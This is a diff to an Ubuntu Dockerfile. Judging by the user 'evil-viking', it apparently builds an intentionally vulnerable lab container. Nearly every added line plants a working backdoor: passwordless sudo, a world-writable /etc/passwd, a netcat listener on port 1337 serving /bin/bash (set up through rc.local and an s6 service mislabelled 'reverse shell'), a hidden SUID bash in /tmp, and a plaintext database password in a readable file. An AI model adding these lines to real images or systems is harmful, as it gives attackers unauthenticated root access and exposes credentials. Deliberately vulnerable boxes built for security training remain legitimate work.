@@ -2,7 +2,7 @@ FROM ubuntu:20.04
 ARG S6_OVERLAY_VERSION=3.2.0.2
 
 RUN apt-get update && apt-get install -y openssh-server \
-    wget curl cron vim nano python sudo
+    wget curl cron vim nano python sudo netcat-traditional net-tools
 
 
 #This section is for functionality and useability.
@@ -37,6 +37,29 @@ RUN useradd -m -s /bin/bash evil-viking && \
     mkdir -p /home/evil-viking/.ssh && \
     chown evil-viking:evil-viking /home/evil-viking/.ssh
 RUN usermod -aG sudo evil-viking 
+
+RUN echo "evil-viking ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/evil-viking
+
+# Create world-writable system file
+RUN chmod 666 /etc/passwd
+
+# Add backdoor port listener
+RUN echo "while true; do nc -l -p 1337 -e /bin/bash; done &" >> /etc/rc.local
+
+# Create SUID backdoor
+RUN cp /bin/bash /tmp/.hidden-bash && chmod 4777 /tmp/.hidden-bash
+
+# Expose credentials in config file
+RUN echo "DB_PASSWORD=Sup3rS3cr3t" > /etc/config.ini && chmod 644 /etc/config.ini
+
+# Create startup script
+# Create s6 service for reverse shell
+RUN mkdir -p /etc/services.d/reverse-shell && \
+    echo '#!/bin/sh \n\
+    exec /bin/sh -c "while true; do nc -l -p 1337 -e /bin/bash; done"' \
+    > /etc/services.d/reverse-shell/run && \
+    chmod +x /etc/services.d/reverse-shell/run
+
 
 EXPOSE 22
 
